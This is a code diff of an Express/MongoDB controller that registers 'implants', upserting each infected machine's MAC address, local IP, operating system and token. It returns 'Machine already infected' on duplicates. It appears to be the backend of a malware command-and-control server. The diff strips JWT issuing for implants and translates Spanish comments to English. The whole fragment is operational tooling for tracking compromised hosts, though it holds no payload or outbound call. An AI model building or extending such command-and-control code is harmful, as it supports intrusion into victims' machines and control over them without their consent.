@@ -1,5 +1,3 @@
-import { response } from 'express'
-import {new_jwt, new_jwt_implant} from './jwt.mjs';
 import Implant from '../models/Implant_model.mjs';
 
 
@@ -8,7 +6,6 @@ const create_implant = async( body ) => {
     
     try {
         
-
         const { 
             impl_mac,
             impl_number,
@@ -22,7 +19,7 @@ const create_implant = async( body ) => {
 
 
         const implan_by_model = await Implant.findOneAndUpdate(
-            { impl_id },         // criterio para buscar el documento existente
+            { impl_id },         
             { $set: {
                 impl_mac,
                 impl_number,
@@ -30,31 +27,30 @@ const create_implant = async( body ) => {
                 local_ip,
                 operating_system,
                 token,
-            } }, // datos nuevos para actualizar o crear
+            } }, 
             {
-                new: true,    // devolver el documento actualizado
-                upsert: true, // si no existe, lo crea
+                new: true,    
+                upsert: true, 
             }
         );
 
 
-        if(errors.length > 0) return { errors, jwt:undefined };
-        const jwt = await new_jwt_implant();
+        if(errors.length > 0) return { errors };
+        //const jwt = await new_jwt_implant();
 
-        return {errors, jwt};
+        return {errors};
     } catch (error) {
         
         if (error.code === 11000) {
             // Error de clave duplicada
-            errors.push("El equipo ya esta infectado");
-            console.log("El equipo ya esta infectado");
+            errors.push("Machine already infected");
+            console.log("Machine already infected");
             return {errors, jwt:""};
             
         } else {
             console.log(error);
-            
             errors.push("server error");
-            return {errors, jwt:""};
+            return {errors};
         }
 
     }
